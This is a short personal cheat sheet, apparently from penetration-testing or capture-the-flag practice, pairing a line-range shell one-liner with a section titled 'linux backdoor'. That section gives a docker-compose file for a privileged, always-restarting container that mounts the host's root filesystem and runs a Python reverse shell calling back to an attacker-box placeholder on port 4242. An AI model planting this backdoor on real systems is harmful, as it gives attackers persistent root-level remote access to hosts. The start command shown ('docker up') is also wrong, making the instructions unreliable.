# miscellaneous
for selecting a range of lines in a file

`cat word.txt | head -1000 | tail -500 | tee <new-file.txt>exec`

linux backdoor:

create `docker-compose.yml` with the following and run `docker up` to start it.

```text-plain
---
version: "2.1"
services:
  backdoorservice:
    restart: always
    image: ghcr.io/jroo1053/ctfscore:master
    entrypoint: > 
       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
       s.connect(("<ATTACKBOXIP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
       pty.spawn("/bin/sh")'
    volumes:
      - /:/mnt
    privileged: true
```